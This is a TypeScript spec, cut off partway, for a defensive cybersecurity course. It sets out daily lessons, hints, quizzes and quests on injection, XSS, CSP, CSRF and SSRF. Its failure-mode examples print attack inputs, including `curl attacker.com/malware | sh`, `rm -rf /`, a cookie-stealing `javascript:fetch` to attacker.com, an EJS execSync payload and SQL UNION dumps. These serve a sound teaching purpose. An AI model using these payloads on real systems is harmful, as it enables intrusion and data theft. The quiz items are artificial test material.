// scripts/visuals/cybersecurity-masterclass-spec.ts
// Exhaustive 60-Day Masterclass Specification for Cybersecurity Principles & Secure Systems (course-cybersecurity)
// Total Quests: 240 Quests (Month 1: 120 Quests, Month 2: 120 Quests)
// Conforming strictly to Gate v2 semantic standard, 3-Tier Socratic Hint Ladders, OWASP Top 10, NIST SP 800-53, and CIS Benchmarks.

import { MasterclassDaySpec } from './java-masterclass-spec';

export const CYBERSECURITY_MONTH_1_SPECS: MasterclassDaySpec[] = [
  // ─── BLOCK 1: Threat Modeling & Injection Attacks (Days 1–5) ────────────────
  {
    day: 1,
    month: 1,
    blockNum: 1,
    title: "Threat Modeling: STRIDE, DREAD, Data Flow Diagrams (DFD) & Trust Boundaries",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Threat Modeling & Trust Boundaries)",
    spokenGoal: "Deconstruct system architecture before writing a single line of defensive code: learn how to draw Data Flow Diagrams (DFD), establish trust boundaries between untrusted client networks and secure backends, and systematically categorize attack vectors using Microsoft's STRIDE and DREAD risk matrices.",
    conceptInvariant: "Trust Boundary Invariant: Any interface or network boundary where data crosses from an entity with lower privilege to an entity with higher privilege is an untrusted perimeter. All incoming data across a trust boundary must be treated as hostile until validated, normalized, and cryptographically verified.",
    failureMode: "Designing an authentication microservice that implicitly trusts internal HTTP headers forwarded by an API gateway, allowing external attackers to spoof the X-Authenticated-User-ID header and gain arbitrary admin access.",
    tryItFriction: "Analyze a multi-tier e-commerce payment architecture and identify the 4 missing trust boundaries between mobile clients, API gateways, payment microservices, and third-party webhooks.",
    socraticHints: [
      "Where does user-controlled data enter the system without cryptographic validation?",
      "Can an attacker reach the payment worker directly, or do they forge requests through the edge gateway?",
      "Establish a trust boundary at the gateway and enforce signed HMAC tokens between internal microservices."
    ],
    situationalPuzzle: {
      scenario: "During a security architecture review, an engineer argues that since the microservice cluster runs inside a private VPC, service-to-service RPC calls do not need authentication or parameter validation. Why is this a catastrophic architectural anti-pattern?",
      options: [
        "Private VPCs have slower network throughput without TLS encryption.",
        "Perimeter Fallacy Trap: Once an attacker breaches a single perimeter node (via SSRF or container escape), lack of internal trust boundaries allows unfettered lateral movement across the entire infrastructure.",
        "AWS and GCP automatically block unencrypted HTTP traffic inside VPCs.",
        "PostgreSQL databases cannot accept connections without mutual TLS."
      ],
      answerIdx: 1,
      debrief: "Relying solely on external firewall perimeters is the classic 'castle-and-moat' fallacy. Zero-Trust Architecture dictates that internal microservices must treat all incoming RPCs across trust boundaries as potentially malicious."
    },
    quests: [
      { id: "sec-m1-d01-q1", name: "STRIDE Threat Vector Categorizer Matrix", type: "concept", desc: "Map Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege across network components." },
      { id: "sec-m1-d01-q2", name: "Detective Lab: Deconstructing the Unauthenticated Internal Header Breach", type: "detective", desc: "Trace an exploit payload where an attacker bypassed authorization by injecting spoofed X-Forwarded-User headers into an internal service." },
      { id: "sec-m1-d01-q3", name: "Mastery Assignment: DREAD Quantitative Risk Scoring Engine", type: "assignment", desc: "Implement a TypeScript scoring engine calculating Damage, Reproducibility, Exploitability, Affected Users, and Discoverability for vulnerability triage." },
      { id: "sec-m1-d01-q4", name: "Production Incident Lab: Zero-Day Lateral Movement Triage across VPC", type: "detective", desc: "Investigate a production incident where an unauthenticated internal Redis cache allowed lateral pivot after an SSRF breach." }
    ]
  },
  {
    day: 2,
    month: 1,
    blockNum: 1,
    title: "SQL Injection (SQLi): AST Query Rewriting, Blind Boolean & Time-Based Extraction",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Query Compilation & Parameter Separation)",
    spokenGoal: "Understand the compiler mechanics behind SQL Injection: learn how concatenating untrusted strings rewrites the database's Abstract Syntax Tree (AST), and master defenses using parameterized prepared statements, stored procedures, and ORM safe query builders.",
    conceptInvariant: "Code-Data Separation Invariant: SQL queries must be parsed, planned, and compiled into an immutable AST before user inputs are bound. In parameterized prepared statements, user input is treated strictly as literal data constants, never as executable SQL tokens or grammar operators.",
    failureMode: "Using string interpolation in dynamic SQL queries to filter user orders, allowing an attacker to submit `admin' --` or `1' UNION SELECT username, password_hash FROM users --` to dump the entire user database.",
    tryItFriction: "Refactor a vulnerable legacy Node.js/Postgres query builder that uses string concatenation into secure prepared statements using positional parameter placeholders ($1, $2).",
    socraticHints: [
      "Why does `SELECT * FROM users WHERE id = ' + input` fail when input is `' OR '1'='1`?",
      "Because the single quote terminates the string literal token and injects a boolean operator into the SQL parser!",
      "Use prepared statement placeholders (`$1`) so the database engine compiles the query template once and binds inputs strictly as typed values."
    ],
    situationalPuzzle: {
      scenario: "A developer attempts to prevent SQL injection by writing a custom regex filter that strips `SELECT`, `UNION`, and `DROP` keywords from user input before inserting into a raw SQL query. Why will this defense fail in production?",
      options: [
        "Regex matching slows down the server CPU.",
        "Filter Evasion Trap: Attackers can bypass naive regex filters using case variation (`sElEcT`), nested keywords (`SELSELECTECT`), hex encoding, or non-keyword injection vectors (e.g. `OR 1=1`), because the query compiler still receives executable code instead of bound parameters.",
        "PostgreSQL only accepts base64-encoded SQL queries.",
        "SQL injection cannot be executed over HTTPS connections."
      ],
      answerIdx: 1,
      debrief: "Blacklist regex filtering is notoriously fragile and easily bypassed via token nesting or character encoding. The only mathematically secure defense is separating code compilation from data binding via parameterized queries."
    },
    quests: [
      { id: "sec-m1-d02-q1", name: "SQL AST Query Parser & Token Dissection", type: "concept", desc: "Inspect how database lexers parse SQL tokens and how injection modifies query parse trees." },
      { id: "sec-m1-d02-q2", name: "Detective Lab: Exploiting Blind Boolean & Time-Based SQLi", type: "detective", desc: "Analyze a time-based blind injection exploit using `pg_sleep(5)` and extract hidden database version strings byte-by-byte." },
      { id: "sec-m1-d02-q3", name: "Mastery Assignment: Type-Safe Prepared Statement Query Compiler", type: "assignment", desc: "Build a TypeScript query builder that enforces parameterized placeholder generation and rejects unescaped raw string concatenation." },
      { id: "sec-m1-d02-q4", name: "Production Incident Lab: 3 AM Data Exfiltration Forensic Analysis", type: "detective", desc: "Triage production database audit logs to isolate the exact vulnerable endpoint exploited in an unauthorized customer table dump." }
    ]
  },
  {
    day: 3,
    month: 1,
    blockNum: 1,
    title: "Command Injection & Path Traversal: POSIX Syscalls, Null-Byte Poisoning & Path Canonicalization",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Operating System Process Boundaries)",
    spokenGoal: "Stop attackers from hijacking the operating system: explore how vulnerable shell wrappers execute arbitrary shell commands via metacharacters (; | && $()), and prevent directory traversal using strict path canonicalization and whitelist validation.",
    conceptInvariant: "Execution Separation Invariant: Never invoke the OS system shell (`sh`, `bash`, `cmd.exe`) to execute binaries with user parameters. Use direct process execution (`execFile`, `posix_spawn`) with array argument vectors so metacharacters are treated as literal argument strings rather than shell command separators.",
    failureMode: "Using `child_process.exec('convert ' + userFilename + ' output.png')` to resize images, allowing an attacker to submit `test.png; rm -rf /` or `test.png && curl attacker.com/malware | sh`.",
    tryItFriction: "Write a secure file retrieval handler in Node.js that resolves relative paths using `path.resolve()`, verifies that the canonical path starts with the base directory, and prevents `../../etc/passwd` escapes.",
    socraticHints: [
      "Why is `path.join('/uploads', userPath)` unsafe if `userPath` is `../../etc/passwd`?",
      "Because `..` segments traverse up the directory hierarchy out of the intended uploads directory!",
      "Use `path.resolve()`, verify `resolvedPath.startsWith(allowedRootDirectory)`, and reject any path traversal attempts."
    ],
    situationalPuzzle: {
      scenario: "A backend service allows users to download generated invoices by passing a filename parameter. An attacker requests `?file=../../../../etc/shadow`. The application checks `if (file.includes('..')) throw new Error()`, yet the attacker still successfully downloads `/etc/shadow`. How did they bypass the check?",
      options: [
        "The server used HTTP/2 multiplexing.",
        "URL Encoding & Path Normalization Trap: The attacker passed URL-encoded or double-encoded characters (`%2e%2e%2f` or `..%252f`), which bypassed the naive string check before being decoded by the web framework into traversal dots.",
        "The Linux kernel ignores dot characters in file paths.",
        "The invoice service was running on Windows."
      ],
      answerIdx: 1,
      debrief: "Filtering raw strings before decoding or path normalization is a fatal flaw. Applications must normalize and canonicalize paths (`realpath`) and verify that the target path is strictly within the allowed directory hierarchy."
    },
    quests: [
      { id: "sec-m1-d03-q1", name: "POSIX Shell Metacharacter Execution Mechanics", type: "concept", desc: "Examine how shell interpreters evaluate command chaining operators, pipes, backticks, and environment variables." },
      { id: "sec-m1-d03-q2", name: "Detective Lab: Deobfuscating Traversal Bypass Payloads", type: "detective", desc: "Analyze traversal payloads utilizing Unicode normalization, URL double-encoding, and null-byte termination." },
      { id: "sec-m1-d03-q3", name: "Mastery Assignment: Hermetic Safe File & Process Execution Gateway", type: "assignment", desc: "Build a TypeScript module executing external utilities using argument vectors and canonical root boundary enforcement." },
      { id: "sec-m1-d03-q4", name: "Production Incident Lab: Remote Shell Spawned via Image Conversion Hook", type: "detective", desc: "Analyze a production incident where an attacker leveraged an unquoted image converter parameter to open a reverse shell on a worker pod." }
    ]
  },
  {
    day: 4,
    month: 1,
    blockNum: 1,
    title: "Server-Side Template Injection (SSTI) & Remote Code Execution (RCE) in Modern Engines",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Template Sandbox Escapes & Reflection)",
    spokenGoal: "Discover how dynamic server-side template rendering (Jinja2, Handlebars, Thymeleaf, EJS) can lead to full Remote Code Execution (RCE): inspect template engine ASTs, understand object introspection escapes, and implement sandboxed, logic-less template boundaries.",
    conceptInvariant: "Template Boundary Invariant: Templates are code structures; user input must strictly be passed as data context variables, never concatenated into the template source string before compilation. Once an attacker can inject template directives (`{{ ... }}`), they control the evaluator's runtime execution engine.",
    failureMode: "Concatenating user-submitted welcome messages into an EJS template (`ejs.render('Hello ' + req.body.name)`), allowing an attacker to submit `<%= process.mainModule.require('child_process').execSync('whoami') %>` and execute code on the host.",
    tryItFriction: "Audit a vulnerable email notification service that renders custom user greeting templates, and refactor it to compile static templates with safe data binding objects.",
    socraticHints: [
      "Why is `nunjucks.renderString('Welcome ' + userText)` dangerous even if `userText` contains no HTML?",
      "Because template engines parse `{{ ... }}` or `{% ... %}` as executable programming expressions!",
      "Never render dynamic strings as templates; compile pre-authored template files and pass user variables in the context object."
    ],
    situationalPuzzle: {
      scenario: "An enterprise report generator uses a template engine to generate PDF receipts. To prevent security issues, developers disabled file access. However, an attacker passed `{{7*7}}` which returned `49`, and then leveraged Java object reflection to invoke `Runtime.getRuntime().exec()`. What fundamental architectural failure occurred?",
      options: [
        "The PDF generator ran out of memory.",
        "Template Compilation Trap: The application treated untrusted user input as template source code rather than data context, enabling Server-Side Template Injection that broke out of the template sandbox via runtime reflection.",
        "The attacker injected SQL through the PDF viewer.",
        "The server failed to enforce HTTPS."
      ],
      answerIdx: 1,
      debrief: "SSTI occurs when user input is parsed as template code. Disabling file access is insufficient if the template engine provides reflection or prototype traversal that allows access to runtime execution contexts."
    },
    quests: [
      { id: "sec-m1-d04-q1", name: "Template AST Evaluation & Sandbox Escape Vectors", type: "concept", desc: "Trace how template engines build ASTs and how object traversal escapes sandbox restrictions." },
      { id: "sec-m1-d04-q2", name: "Detective Lab: Differentiating XSS from SSTI Payloads", type: "detective", desc: "Analyze polyglot payloads and determine whether they execute client-side in the browser (XSS) or server-side on the host (SSTI)." },
      { id: "sec-m1-d04-q3", name: "Mastery Assignment: Logic-Less Safe Template Engine Compiler", type: "assignment", desc: "Build a logic-less template renderer that only replaces verified variable identifiers without evaluating arbitrary code." },
      { id: "sec-m1-d04-q4", name: "Production Incident Lab: RCE Exploit in Customer Feedback Report Generator", type: "detective", desc: "Investigate an exploit where an attacker leveraged an unescaped customer feedback preview field to extract AWS IAM credentials." }
    ]
  },
  {
    day: 5,
    month: 1,
    blockNum: 1,
    title: "⭐ MILESTONE 1: Input Sanitization & Web Application Firewall (WAF) AST Filter Engine",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Milestone Gate: AST Sanitization & WAF Rules)",
    spokenGoal: "Assemble Milestone 1: Engineer a high-performance, production-grade Web Application Firewall (WAF) middleware that inspects HTTP headers, query strings, and request bodies using AST parsing, token normalization, and deterministic boundary validation.",
    conceptInvariant: "Deterministic Inspection Invariant: A secure WAF must normalize inputs (URL decoding, Unicode normalization, whitespace collapsing) before applying deterministic inspection rules. Any inspection performed on un-normalized raw bytes allows attackers to bypass security filters via encoding tricks.",
    failureMode: "Inspecting raw URL parameters before URL decoding, causing the WAF to approve `%3Cscript%3E` or `%27%20OR%201%3D1` as benign strings while the downstream backend decodes and executes the attack.",
    tryItFriction: "Complete Milestone 1 by constructing an AST-based input inspection pipeline that normalizes payloads, detects SQLi, command injection, and traversal patterns, and outputs structured security audit logs.",
    socraticHints: [
      "Why must normalization occur before rule evaluation in a WAF pipeline?",
      "Because attackers use multi-byte encodings and hex escapes to disguise signatures from naive string scanners!",
      "Normalize through canonical decode passes, inspect AST tokens, and reject requests that violate structural schemas."
    ],
    situationalPuzzle: {
      scenario: "A fintech WAF blocks 99% of SQL injection attempts, but a penetration tester successfully injects SQL into an address search endpoint using `1/**/UNION/**/SELECT`. Why did the WAF fail to trigger an alert?",
      options: [
        "The WAF database was offline.",
        "Lexical Whitespace Evasion Trap: The WAF signature rule searched for spaces between SQL keywords (`UNION SELECT`). The database SQL parser treats C-style comments `/**/` as valid token separators, evading the regex without invalidating the SQL query.",
        "PostgreSQL requires SSL certificates for comment tokens.",
        "The penetration tester spoofed their MAC address."
      ],
      answerIdx: 1,
      debrief: "Regex string matching on whitespace is inherently flawed because SQL parsers treat comments, tabs, and line breaks as token delimiters. Modern WAF engines use tokenization and lexer models rather than static string matching."
    },
    quests: [
      { id: "sec-m1-d05-q1", name: "Milestone 1 Architecture: WAF Normalization Pipeline", type: "concept", desc: "Design a multi-stage request normalization and anomaly detection architecture for edge proxies." },
      { id: "sec-m1-d05-q2", name: "Detective Lab: Validating WAF Evasion via Multi-Encoding Mutations", type: "detective", desc: "Test a WAF filter with double URL-encoded, UTF-8 overlong, and HTML entity payload mutations." },
      { id: "sec-m1-d05-q3", name: "Mastery Assignment: Production AST Web Application Firewall Middleware", type: "assignment", desc: "Implement a TypeScript WAF middleware with request normalization, threat scoring, and structured JSON alert streaming." },
      { id: "sec-m1-d05-q4", name: "Production Incident Lab: Zero-Day WAF Bypass Triage on Banking API Gateway", type: "detective", desc: "Defend against an active production bypass targeting a banking funds-transfer endpoint during a live red-team exercise." }
    ]
  },

  // ─── BLOCK 2: Client-Side Security & State Defense (Days 6–10) ────────────────
  {
    day: 6,
    month: 1,
    blockNum: 2,
    title: "Cross-Site Scripting (XSS): Stored, Reflected, DOM-Based & Context-Aware Escaping",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Browser DOM Execution & Context Escaping)",
    spokenGoal: "Master the 3 variants of Cross-Site Scripting (Stored, Reflected, DOM-based): understand how browsers parse HTML, attributes, JavaScript, and CSS contexts differently, and implement context-aware output encoding to eliminate client-side script execution.",
    conceptInvariant: "Context-Aware Encoding Invariant: HTML entity encoding (`&lt;`, `&gt;`) is only secure in HTML body context. When inserting data into HTML attributes (`href`, `src`), JavaScript blocks (`<script>`), or event handlers (`onclick`), context-specific encoding (URI encoding, JavaScript hex encoding) is mandatory to prevent execution.",
    failureMode: "Inserting a user-supplied website URL directly into an `<a href=\"...\">` tag after only HTML-escaping it, allowing an attacker to submit `javascript:fetch('attacker.com?c=' + document.cookie)` which executes upon click.",
    tryItFriction: "Build a context-aware sanitizer in TypeScript that correctly escapes user input depending on whether the target sink is HTML body, an attribute string, a URI scheme, or an inline JSON object.",
    socraticHints: [
      "Why is `&quot;` ineffective at preventing script execution inside `href=\"USER_INPUT\"`?",
      "Because `javascript:...` executes without needing double quotes or HTML angle brackets!",
      "Validate the URI protocol to ensure it strictly matches `http:` or `https:` and disallows `javascript:` pseudo-protocols."
    ],
    situationalPuzzle: {
      scenario: "A developer builds a single-page app that takes a username from the URL hash (`location.hash`) and writes it to the page using `element.innerHTML = 'Welcome ' + decodeURIComponent(hash)`. A security scanner flags this as high-severity DOM XSS. The developer claims 'It never touches the server, so it cannot be exploited'. Why are they fatally mistaken?",
      options: [
        "The browser will refuse to load the website without server verification.",
        "DOM-Based XSS Trap: The payload executes entirely inside the victim's client browser when they open a crafted link (`example.com/#<img src=x onerror=alert(1)>`). Attackers can steal session storage, localStorage tokens, and perform actions on the victim's behalf without any server logs.",
        "DOM XSS only affects Internet Explorer.",
        "URL hash fragments are automatically stripped by modern TLS."
      ],
      answerIdx: 1,
      debrief: "DOM-based XSS occurs entirely client-side when untrusted data from a source (like `location.hash`) is passed to an unsafe sink (like `innerHTML` or `eval`). No server interaction is needed for an attacker to execute malicious code in the user's session."
    },
    quests: [
      { id: "sec-m1-d06-q1", name: "Browser Lexer & HTML Context Parsing Invariants", type: "concept", desc: "Map how web browser parsers transition states between HTML, attribute, script, and CSS contexts." },
      { id: "sec-m1-d06-q2", name: "Detective Lab: Dissecting DOM-Based XSS Sources & Sinks", type: "detective", desc: "Audit a client-side codebase to locate unsafe sinks (`innerHTML`, `document.write`, `eval`) reading from user-controlled sources." },
      { id: "sec-m1-d06-q3", name: "Mastery Assignment: Context-Aware Sanitizer & Protocol Validator", type: "assignment", desc: "Implement a TypeScript encoder that enforces strict protocol validation and contextual escaping across body, attribute, and URI targets." },
      { id: "sec-m1-d06-q4", name: "Production Incident Lab: Session Token Theft via Profile Badge SVG XSS", type: "detective", desc: "Investigate a production incident where an uploaded SVG avatar with an embedded `<script>` tag exfiltrated session cookies." }
    ]
  },
  {
    day: 7,
    month: 1,
    blockNum: 2,
    title: "Content Security Policy (CSP Level 3): Strict-Dynamic, Cryptographic Nonces & Hashes",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Browser Sandbox Enforcement)",
    spokenGoal: "Harden the browser execution environment with modern Content Security Policy (CSP Level 3): eliminate dangerous `unsafe-inline` directives, implement cryptographically random per-request nonces, and leverage `strict-dynamic` to allow trusted module loaders.",
    conceptInvariant: "CSP Nonce Invariant: A CSP nonce must be cryptographically random (at least 128 bits from a CSPRNG), generated freshly for every single HTTP response, and never reused across requests. Hardcoding or reusing nonces allows attackers to craft stored payloads that pass the browser's script execution policy.",
    failureMode: "Using a static CSP nonce (`script-src 'nonce-abc123'`) across all requests, allowing an attacker to inject `<script nonce=\"abc123\">` into any vulnerable comment field and completely bypass CSP enforcement.",
    tryItFriction: "Write an Express/Fastify middleware that generates a fresh base64-encoded 128-bit CSPRNG nonce per request, injects it into the `Content-Security-Policy` header, and passes it to the server-side template renderer.",
    socraticHints: [
      "What happens if an attacker knows the nonce value in advance?",
      "They can add `nonce=\"VALUE\"` to their injected script tag, and the browser will execute it without question!",
      "Generate the nonce using `crypto.randomBytes(16).toString('base64')` on each request and bind it to the template engine."
    ],
    situationalPuzzle: {
      scenario: "A company implements CSP with `script-src 'self' https://trusted-cdn.com`. A security consultant demonstrates an XSS exploit that executes arbitrary JavaScript despite the CSP header. How did the consultant bypass this domain-allowlist CSP?",
      options: [
        "The consultant disabled CSP in their local browser.",
        "Allowlist Bypass / JSONP Trap: The trusted CDN hosted older JavaScript libraries or endpoints with JSONP/Angular endpoints that allowed arbitrary callback execution, enabling the attacker to construct a valid script URL that executed user-controlled code.",
        "CSP domain allowlists only function over unencrypted HTTP.",
        "The CDN server crashed during the attack."
      ],
      answerIdx: 1,
      debrief: "Domain-allowlist CSPs are notoriously bypassable because popular CDNs often host libraries with gadget chains, open redirects, or JSONP endpoints. CSP Level 3 recommends nonce-based policies with `'strict-dynamic'` instead of domain whitelists."
    },
    quests: [
      { id: "sec-m1-d07-q1", name: "CSP Level 3 Directives & Enforcement Rules", type: "concept", desc: "Detail directives including default-src, script-src, object-src, frame-ancestors, and report-uri." },
      { id: "sec-m1-d07-q2", name: "Detective Lab: Auditing Flawed CSP Configurations & Bypass Gadgets", type: "detective", desc: "Analyze CSP policies containing unsafe-eval, wildcards (*), and vulnerable CDN endpoints to identify bypass paths." },
      { id: "sec-m1-d07-q3", name: "Mastery Assignment: Cryptographic Nonce CSP Middleware & Report Aggregator", type: "assignment", desc: "Build a TypeScript middleware issuing per-request nonces with strict-dynamic and an endpoint parsing CSP violation reports." },
      { id: "sec-m1-d07-q4", name: "Production Incident Lab: Triage of Automated CSP Violation Telemetry Spikes", type: "detective", desc: "Investigate a sudden spike in CSP violation reports indicating an ongoing third-party dependency compromise (Magecart attack)." }
    ]
  },
  {
    day: 8,
    month: 1,
    blockNum: 2,
    title: "Cross-Site Request Forgery (CSRF): Double Submit Cookies, Synchronizer Tokens & SameSite",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Cross-Origin Request Authentication)",
    spokenGoal: "Understand how browsers handle ambient credentials (cookies) in cross-origin requests: dissect Cross-Site Request Forgery (CSRF), analyze why `SameSite=Lax` is not a complete panacea, and engineer robust anti-CSRF synchronizer tokens and cryptographically signed double-submit cookies.",
    conceptInvariant: "Origin-State Decoupling Invariant: Ambient authentication credentials (cookies) sent automatically by the browser do not prove user intent. State-modifying requests (POST, PUT, DELETE) must require an explicit, unguessable proof of intent (anti-CSRF token or custom Authorization header) that an external origin cannot read or forge.",
    failureMode: "Relying solely on session cookies for a `POST /api/transfer` funds transfer endpoint, allowing an external malicious site to submit a hidden `<form action=\"bank.com/transfer\" method=\"POST\">` that transfers money using the victim's active session.",
    tryItFriction: "Implement an anti-CSRF middleware using cryptographically signed HMAC double-submit cookies, verifying that the request header `X-CSRF-Token` matches the decrypted signature of the cookie.",
    socraticHints: [
      "Why can't an attacker's website just read the victim's CSRF cookie directly?",
      "Because the Same-Origin Policy (SOP) prevents cross-origin scripts from reading cookies belonging to another domain!",
      "Require the client JavaScript to read the token and echo it back in a custom HTTP header (`X-CSRF-Token`), which cross-origin attackers cannot forge."
    ],
    situationalPuzzle: {
      scenario: "A web application sets `SameSite=Lax` on all session cookies. An engineer declares that all CSRF defenses (anti-CSRF tokens) can now be removed. Why is this an unsafe security decision?",
      options: [
        "Lax cookies expire after 5 minutes.",
        "Top-Level Navigation Trap: Under `SameSite=Lax`, cookies are still attached to top-level cross-site GET requests (such as window.location or `<a href>`). If any state-changing endpoints accidentally accept GET requests or can be method-overridden, they remain fully vulnerable to CSRF.",
        "Chrome does not support the SameSite cookie attribute.",
        "SameSite only works on localhost."
      ],
      answerIdx: 1,
      debrief: "`SameSite=Lax` provides baseline protection for POST forms, but top-level GET navigations still send cookies. If any state-modifying action can be triggered via GET, or if older browsers lack SameSite support, the application remains exposed without anti-CSRF tokens."
    },
    quests: [
      { id: "sec-m1-d08-q1", name: "Cross-Origin Ambient Credential & SOP Mechanics", type: "concept", desc: "Analyze browser cookie handling across cross-origin requests, iframe embeddings, and top-level links." },
      { id: "sec-m1-d08-q2", name: "Detective Lab: Crafting CSRF Proof-of-Concept Exploit Payloads", type: "detective", desc: "Build a harmless local POC demonstrating unauthorized state mutation against an unprotected cookie-authenticated API." },
      { id: "sec-m1-d08-q3", name: "Mastery Assignment: HMAC-Signed Double-Submit CSRF Protection Engine", type: "assignment", desc: "Implement a stateless TypeScript anti-CSRF engine using HMAC-SHA256 cookie signing and header token validation." },
      { id: "sec-m1-d08-q4", name: "Production Incident Lab: Unauthorized Admin Password Reset via CSRF", type: "detective", desc: "Triage web server logs after an executive's administrative password was reset via a deceptive phishing link." }
    ]
  },
  {
    day: 9,
    month: 1,
    blockNum: 2,
    title: "Server-Side Request Forgery (SSRF): DNS Rebinding, Cloud Metadata Endpoints & Egress Filters",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Internal Network Perimeter Protection)",
    spokenGoal: "Neutralize Server-Side Request Forgery (SSRF): explore how backend webhook fetchers, image importers, and URL unfurlers can be tricked into probing internal localhost services and cloud instance metadata endpoints (169.254.169.254), and defeat DNS rebinding attacks.",
    conceptInvariant: "Network Egress Invariant: Never allow backend HTTP clients to resolve and connect to IP addresses in private, link-local, loopback, or reserved RFC 1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16). IP resolution must occur at connection time to defeat Time-Of-Check to Time-Of-Use (TOCTOU) DNS rebinding.",
    failureMode: "Resolving a URL's hostname once, checking that it resolves to a public IP, and then calling `fetch(url)`: an attacker uses a DNS server with TTL=0 that resolves to public IP on check and 169.254.169.254 on connect, stealing cloud IAM keys.",
    tryItFriction: "Build a secure HTTP client in Node.js using a custom agent lookup hook that resolves IP addresses immediately before socket creation and terminates connections if the target IP is within private CIDR ranges.",
    socraticHints: [
      "Why is validating `url.hostname` with `dns.resolve()` vulnerable to DNS rebinding?",
      "Because the second DNS lookup performed inside `http.get()` can return a completely different IP address!",
      "Pin the resolved IP address, validate it against private CIDR masks, and connect directly to the pinned IP with the original Host header."
    ],
    situationalPuzzle: {
      scenario: "An image import service blocks `127.0.0.1` and `169.254.169.254` by checking the hostname string. An attacker submits `http://0177.0.0.1/` and `http://2130706433/` and successfully fetches internal status endpoints. How did this bypass occur?",
      options: [
        "The server used IPv6 instead of IPv4.",
        "IP Representation Ambiguity Trap: IPv4 addresses can be written in octal (`0177.0.0.1`), hexadecimal (`0x7f.0.0.1`), or integer (`2130706433`) notation. Naive string matching fails because the OS socket layer automatically normalizes all these forms to 127.0.0.1.",
        "The attacker injected a SQL statement into the DNS server.",
        "The image converter crashed."
      ],
      answerIdx: 1,
      debrief: "Blacklisting string representations of IP addresses is easily bypassed using octal, decimal integer, or hex IP encodings. Software must parse the address into its canonical 32-bit binary integer or 128-bit IPv6 representation before validating against CIDR ranges."
    },
    quests: [
      { id: "sec-m1-d09-q1", name: "Cloud Metadata APIs & RFC 1918 Private CIDR Enclaves", type: "concept", desc: "Review internal cloud infrastructure endpoints (AWS IMDSv2, GCP metadata) and private IP ranges." },
      { id: "sec-m1-d09-q2", name: "Detective Lab: Simulating DNS Rebinding TOCTOU Race Conditions", type: "detective", desc: "Construct a test harness simulating an alternating DNS responder (TTL=0) bypassing naive hostname verification." },
      { id: "sec-m1-d09-q3", name: "Mastery Assignment: Anti-SSRF Safe HTTP Client with Socket Pinning", type: "assignment", desc: "Implement a TypeScript HTTP client that pins resolved IPs, validates CIDRs, and enforces IMDSv2 token checks." },
      { id: "sec-m1-d09-q4", name: "Production Incident Lab: AWS IAM Instance Credentials Exfiltration Triage", type: "detective", desc: "Investigate a production breach where an attacker accessed the EC2 metadata service via an unauthenticated PDF generator URL." }
    ]
  },
  {
    day: 10,
    month: 1,
    blockNum: 2,
    title: "⭐ MILESTONE 2: Client-Side Armor: Zero-Trust CSP & Anti-CSRF Synchronizer Security Gateway",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Milestone Gate: Client-Side Security Gateway)",
    spokenGoal: "Assemble Milestone 2: Build an integrated client-side defense gateway combining automated per-request CSP nonce generation, strict-dynamic policies, origin verification, and HMAC-signed double-submit CSRF protection.",
    conceptInvariant: "Defense-in-Depth Invariant: No single client-side security control is infallible. CSP prevents unauthorized script execution, Anti-CSRF tokens prevent forged state mutations, and SameSite cookie attributes provide baseline ambient isolation. Together they form an impenetrable client defense shield.",
    failureMode: "Deploying an anti-CSRF token but allowing unescaped reflected user input on the same page, allowing an attacker to use XSS to read the anti-CSRF token and execute the forged request anyway.",
    tryItFriction: "Complete Milestone 2 by building an integrated security gateway that injects dynamic CSP nonces, validates incoming CSRF tokens, rejects non-whitelisted HTTP methods, and isolates user sessions.",
    socraticHints: [
      "Why must CSRF protection and XSS protection be deployed together?",
      "Because XSS gives the attacker full JavaScript execution inside the origin, allowing them to read and bypass anti-CSRF tokens!",
      "Enforce strict CSP to stop XSS scripts, and enforce CSRF tokens to stop blind form submissions."
    ],
    situationalPuzzle: {
      scenario: "A fintech dashboard implements strict anti-CSRF tokens on all POST endpoints and sets CSP with nonces. An attacker discovers a CORS configuration on the API that responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`. What is the security outcome?",
      options: [
        "The browser rejects the configuration because the CORS specification explicitly forbids `*` with `Allow-Credentials: true`.",
        "CORS Misconfiguration Trap: In real browsers, if the server echoes back the requesting origin (`Access-Control-Allow-Origin: attacker.com`) with `Allow-Credentials: true`, external scripts can make authenticated credentialed requests and read response bodies, completely bypassing SOP.",
        "The dashboard becomes 10 times faster.",
        "The CSP nonce becomes invalid."
      ],
      answerIdx: 1,
      debrief: "While browsers reject literal `*` with credentials, servers that dynamically reflect `Origin` headers into `Access-Control-Allow-Origin` effectively grant any website the ability to read private user data and CSRF tokens across origins."
    },
    quests: [
      { id: "sec-m1-d10-q1", name: "Milestone 2 Architecture: Unified Client Protection Shield", type: "concept", desc: "Architect an end-to-end client security model integrating CSP, CSRF tokens, CORS validation, and cookie attributes." },
      { id: "sec-m1-d10-q2", name: "Detective Lab: Auditing Wildcard CORS Origin Reflection Vulnerabilities", type: "detective", desc: "Audit an Express API gateway that dynamically reflects untrusted Origin headers and test credentialed extraction." },
      { id: "sec-m1-d10-q3", name: "Mastery Assignment: Full Client Security Gateway with CSP Nonces & CSRF Engine", type: "assignment", desc: "Implement a complete TypeScript security gateway with nonce injection, CORS whitelisting, and signed CSRF validation." },
      { id: "sec-m1-d10-q4", name: "Production Incident Lab: Penetration Test Defense & Multi-Vector Attack Triage", type: "detective", desc: "Defend the application against a coordinated red-team exercise combining DOM XSS, CORS reflection, and CSRF probing." }
    ]
  },

